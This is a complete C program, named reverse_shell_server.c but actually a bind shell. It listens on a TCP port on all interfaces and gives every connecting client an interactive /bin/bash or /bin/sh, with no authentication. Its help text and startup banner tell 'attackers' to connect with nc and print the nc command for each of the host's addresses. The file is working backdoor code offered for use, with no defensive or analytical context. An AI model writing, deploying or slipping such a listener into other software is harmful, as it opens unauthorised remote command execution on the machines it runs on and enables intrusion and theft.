// reverse_shell_server.c
// Compiling : Use 'gcc -O2 -o reverse_shell_server reverse_shell_server.c -Wall'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <pwd.h>
#include <grp.h>
#include <signal.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <termios.h>
#include <errno.h>
#include <netdb.h>

#define BUFFER_SIZE 4096
#define MAX_CONNECTIONS 10

typedef struct {
    int port;
    char shell_path[BUFFER_SIZE];
    char env_string[BUFFER_SIZE];
    int should_terminate;
    pid_t main_pid;
    int verbose;
    int max_connections;
} ShellConfig;

ShellConfig config = {0};

void show_help(const char *prog_name) {
    printf("Usage: %s [OPTIONS]\n", prog_name);
    printf("Options:\n");
    printf("  --port PORT        Set listening port (default: 2323)\n");
    printf("  --shell PATH       Set shell binary path (default: /bin/bash or /bin/sh)\n");
    printf("  --env ENV_VARS     Set environment variables (format: KEY1=val1&KEY2=val2)\n");
    printf("  --max-conn N       Maximum concurrent connections (default: 10)\n");
    printf("  --verbose          Enable verbose output\n");
    printf("  --help             Show this help message\n");
    printf("\nExamples:\n");
    printf("  # Listen default port 2323\n");
    printf("  %s\n", prog_name);
    printf("\n  # Listen custom ports\n");
    printf("  %s --port 6767\n", prog_name);
    printf("\n  # Use custom shell\n");
    printf("  %s --shell /bin/sh --port 4444\n", prog_name);
    printf("\n  # Client connection method\n");
    printf("  nc targetIP 2323\n");
    printf("  nc targetIP 6767\n");
    printf("\nNote: This program LISTENS on the specified port.\n");
    printf("      Attackers can connect using: nc <target_ip> <port>\n");
}

void parse_env_vars(char *env_string) {
    if (strlen(env_string) == 0) return;
    
    char *saveptr;
    char *token = strtok_r(env_string, "&", &saveptr);
    
    while (token != NULL) {
        if (strlen(token) > 0) {
            char *eq_pos = strchr(token, '=');
            if (eq_pos != NULL) {
                *eq_pos = '\0';
                setenv(token, eq_pos + 1, 1);
                if (config.verbose) {
                    printf("[VERBOSE] Set env: %s=%s\n", token, eq_pos + 1);
                }
            }
        }
        token = strtok_r(NULL, "&", &saveptr);
    }
}

int parse_arguments(int argc, char *argv[]) {
    config.port = 2323;
    config.shell_path[0] = '\0';
    config.env_string[0] = '\0';
    config.verbose = 0;
    config.max_connections = MAX_CONNECTIONS;
    
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--help") == 0) {
            show_help(argv[0]);
            return 0;
        }
        else if (strcmp(argv[i], "--verbose") == 0) {
            config.verbose = 1;
            printf("Verbose mode enabled\n");
        }
        else if (strcmp(argv[i], "--port") == 0 && i + 1 < argc) {
            config.port = atoi(argv[++i]);
            if (config.port <= 0 || config.port > 65535) {
                fprintf(stderr, "Error: Invalid port number\n");
                return 0;
            }
            printf("Port set to: %d\n", config.port);
        }
        else if (strcmp(argv[i], "--shell") == 0 && i + 1 < argc) {
            strncpy(config.shell_path, argv[++i], sizeof(config.shell_path) - 1);
            config.shell_path[sizeof(config.shell_path) - 1] = '\0';
            printf("Shell set to: %s\n", config.shell_path);
        }
        else if (strcmp(argv[i], "--env") == 0 && i + 1 < argc) {
            strncpy(config.env_string, argv[++i], sizeof(config.env_string) - 1);
            config.env_string[sizeof(config.env_string) - 1] = '\0';
            if (config.verbose) {
                printf("[VERBOSE] Env string: %s\n", config.env_string);
            }
        }
        else if (strcmp(argv[i], "--max-conn") == 0 && i + 1 < argc) {
            config.max_connections = atoi(argv[++i]);
            if (config.max_connections <= 0) {
                fprintf(stderr, "Error: Invalid max connections\n");
                return 0;
            }
            printf("Max connections set to: %d\n", config.max_connections);
        }
        else {
            fprintf(stderr, "Unknown option: %s\n", argv[i]);
            show_help(argv[0]);
            return 0;
        }
    }
    return 1;
}

void setup_terminal(int fd) {
    struct termios termios;
    if (tcgetattr(fd, &termios) == 0) {
        termios.c_lflag |= ECHO | ICANON;
        termios.c_cc[VINTR] = 3;
        termios.c_cc[VQUIT] = 28;
        termios.c_cc[VERASE] = 127;
        termios.c_cc[VKILL] = 21;
        termios.c_cc[VEOF] = 4;
        tcsetattr(fd, TCSANOW, &termios);
    }
}

void sigchld_handler(int sig) {
    while (waitpid(-1, NULL, WNOHANG) > 0);
}

void sigterm_handler(int sig) {
    config.should_terminate = 1;
    printf("\n[!] Received termination signal, shutting down...\n");
}

void sigint_handler(int sig) {
    config.should_terminate = 1;
    printf("\n[!] Received interrupt signal, shutting down...\n");
}

void find_shell(char *shell_path, size_t size) {
    if (strlen(shell_path) > 0) {
        if (access(shell_path, X_OK) == 0) {
            if (config.verbose) {
                printf("[VERBOSE] Using specified shell: %s\n", shell_path);
            }
            return;
        }
        fprintf(stderr, "Warning: Specified shell '%s' not executable, trying defaults\n", shell_path);
    }
    
    const char *shells[] = {
        "/bin/bash",
        "/bin/sh",
        "/usr/bin/bash",
        "/usr/bin/sh",
        "/system/bin/sh",
        NULL
    };
    
    for (int i = 0; shells[i] != NULL; i++) {
        if (access(shells[i], X_OK) == 0) {
            strncpy(shell_path, shells[i], size - 1);
            shell_path[size - 1] = '\0';
            if (config.verbose) {
                printf("[VERBOSE] Found shell: %s\n", shell_path);
            }
            return;
        }
    }
    
    strncpy(shell_path, "/bin/sh", size - 1);
    shell_path[size - 1] = '\0';
    fprintf(stderr, "Warning: No shell found, using /bin/sh\n");
}

void handle_shell_client(int client_socket, struct sockaddr_in client_addr) {
    char client_ip[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &client_addr.sin_addr, client_ip, INET_ADDRSTRLEN);
    
    if (strlen(config.env_string) > 0) {
    } else {
        struct passwd *pw = getpwuid(getuid());
        if (pw) {
            setenv("USER", pw->pw_name, 1);
            setenv("LOGNAME", pw->pw_name, 1);
            setenv("HOME", pw->pw_dir, 1);
        }
        setenv("TERM", "xterm-256color", 1);
        setenv("PATH", "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", 1);
    }
    
    setenv("REMOTE_ADDR", client_ip, 1);
    char port_str[16];
    snprintf(port_str, sizeof(port_str), "%d", ntohs(client_addr.sin_port));
    setenv("REMOTE_PORT", port_str, 1);
    
    dup2(client_socket, STDIN_FILENO);
    dup2(client_socket, STDOUT_FILENO);
    dup2(client_socket, STDERR_FILENO);
    close(client_socket);
    
    setup_terminal(STDIN_FILENO);
    
    char shell_path[BUFFER_SIZE];
    strncpy(shell_path, config.shell_path, sizeof(shell_path) - 1);
    shell_path[sizeof(shell_path) - 1] = '\0';
    find_shell(shell_path, sizeof(shell_path));
    
    printf("\n[+] New connection from %s:%d\n", client_ip, ntohs(client_addr.sin_port));
    printf("[+] Shell path: %s\n", shell_path);
    
    execl(shell_path, shell_path, "-i", (char *)NULL);
    execl(shell_path, shell_path, (char *)NULL);
    execl("/bin/sh", "sh", "-i", (char *)NULL);
    execl("/bin/sh", "sh", (char *)NULL);
    
    fprintf(stderr, "Failed to execute shell: %s\n", strerror(errno));
    exit(EXIT_FAILURE);
}

void start_shell_server() {
    int server_socket, client_socket;
    struct sockaddr_in server_addr, client_addr;
    socklen_t client_len = sizeof(client_addr);
    pid_t pid;
    
    struct sigaction sa;
    sa.sa_handler = sigchld_handler;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = SA_RESTART;
    if (sigaction(SIGCHLD, &sa, NULL) == -1) {
        perror("sigaction");
        exit(EXIT_FAILURE);
    }
    signal(SIGTERM, sigterm_handler);
    signal(SIGINT, sigint_handler);
    
    if ((server_socket = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }
    
    int opt = 1;
    if (setsockopt(server_socket, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
        perror("setsockopt");
        close(server_socket);
        exit(EXIT_FAILURE);
    }
    
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(config.port);
    
    if (bind(server_socket, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Bind failed");
        close(server_socket);
        exit(EXIT_FAILURE);
    }
    
    if (listen(server_socket, config.max_connections) < 0) {
        perror("Listen failed");
        close(server_socket);
        exit(EXIT_FAILURE);
    }
    
    char hostname[256];
    gethostname(hostname, sizeof(hostname));
    struct hostent *host = gethostbyname(hostname);
    
    printf("\n========================================\n");
    printf("Reverse Shell Server started\n");
    printf("PID: %d\n", getpid());
    printf("Listening on port: %d\n", config.port);
    printf("Max connections: %d\n", config.max_connections);
    printf("\n[+] Waiting for connections...\n");
    printf("[+] Attackers can connect using:\n");
    
    if (host != NULL) {
        for (int i = 0; host->h_addr_list[i] != NULL; i++) {
            char ip[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, host->h_addr_list[i], ip, INET_ADDRSTRLEN);
            printf("    nc %s %d\n", ip, config.port);
        }
    }
    printf("    nc 127.0.0.1 %d\n", config.port);
    printf("========================================\n\n");
    
    while (!config.should_terminate) {
        client_len = sizeof(client_addr);
        
        client_socket = accept(server_socket, (struct sockaddr *)&client_addr, &client_len);
        if (client_socket < 0) {
            if (config.should_terminate) break;
            if (errno != EINTR) {
                perror("Accept failed");
            }
            continue;
        }
        
        pid = fork();
        if (pid < 0) {
            perror("Fork failed");
            close(client_socket);
            continue;
        } else if (pid == 0) {

            close(server_socket);
            handle_shell_client(client_socket, client_addr);
            exit(EXIT_FAILURE);
        } else {

            close(client_socket);
            if (config.verbose) {
                char client_ip[INET_ADDRSTRLEN];
                inet_ntop(AF_INET, &client_addr.sin_addr, client_ip, INET_ADDRSTRLEN);
                printf("[VERBOSE] Forked child PID %d for connection from %s:%d\n", 
                       pid, client_ip, ntohs(client_addr.sin_port));
            }
        }
    }
    
    close(server_socket);
    printf("\n[*] Shell server shutdown complete\n");
}

int main(int argc, char *argv[]) {
    if (!parse_arguments(argc, argv)) {
        return EXIT_FAILURE;
    }
    
    if (argc == 1) {
        printf("Using default configuration...\n");
    }
    
    config.main_pid = getpid();
    config.should_terminate = 0;
    
    if (strlen(config.env_string) > 0) {
        if (config.verbose) {
            printf("[VERBOSE] Parsing environment variables...\n");
        }
        char env_copy[BUFFER_SIZE];
        strncpy(env_copy, config.env_string, sizeof(env_copy) - 1);
        env_copy[sizeof(env_copy) - 1] = '\0';
        parse_env_vars(env_copy);
    }
    
    start_shell_server();
    
    return EXIT_SUCCESS;
}